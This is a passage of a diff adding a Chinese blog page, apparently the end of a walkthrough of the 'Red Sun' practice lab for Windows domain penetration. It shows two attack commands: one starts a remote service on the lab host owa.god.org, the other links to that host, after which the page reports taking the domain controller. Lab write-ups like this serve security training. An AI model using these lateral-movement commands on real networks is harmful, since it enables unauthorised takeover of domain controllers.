+<h4 id="7-5-开启服务"><a href="#7-5-开启服务" class="headerlink" title="7.5 开启服务"></a>7.5 开启服务</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shell </span><span class="hljs-keyword">sc </span>\\owa.god.<span class="hljs-keyword">org </span>start test<br></code></pre></td></tr></table></figure>
+
+<h4 id="7-6-连接目标服务器"><a href="#7-6-连接目标服务器" class="headerlink" title="7.6 连接目标服务器"></a>7.6 连接目标服务器</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">link owa.god<span class="hljs-meta">.org</span><br></code></pre></td></tr></table></figure>
+
+<p>成功获取域控：</p>
+<p><img src="/./img/Snipaste_2025-06-28_19-57-12.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BA%A2%E6%97%A5%E9%9D%B6%E6%9C%BA%E7%B3%BB%E5%88%97/" class="category-chain-item">红日靶机系列</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%A4%8D%E7%9B%98/" class="print-no-link">#复盘</a>
+      
+        <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="print-no-link">#域渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>红日靶场1复盘</div>
+      <div>http://example.com/2025/06/27/红日靶场1复盘/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>XCDH</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/21/%E5%85%8D%E6%9D%80%E4%B9%8BCS%E5%89%8D%E7%BD%AE%E9%9A%90%E5%8C%BF/" title="免杀之CS前置隐匿">
+                        <span class="hidden-mobile">免杀之CS前置隐匿</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>XCDH</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
